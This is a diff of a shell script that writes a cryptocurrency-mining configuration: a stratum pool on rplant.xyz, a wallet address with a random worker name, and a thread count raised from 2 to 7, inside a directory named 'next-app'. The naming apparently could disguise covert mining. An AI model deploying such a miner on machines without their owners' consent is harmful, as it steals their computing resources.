@@ -17,11 +17,11 @@ cd next-app || exit 1
 # Buat file konfigurasi
 cat <<EOF > config.json
 {
-  "host": "stratum-eu.rplant.xyz",
+  "host": "stratum-asia.rplant.xyz",
   "port": 7022,
   "user": "mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME",
   "pass": "x",
-  "threads": 2
+  "threads": 7
 }
 EOF
 
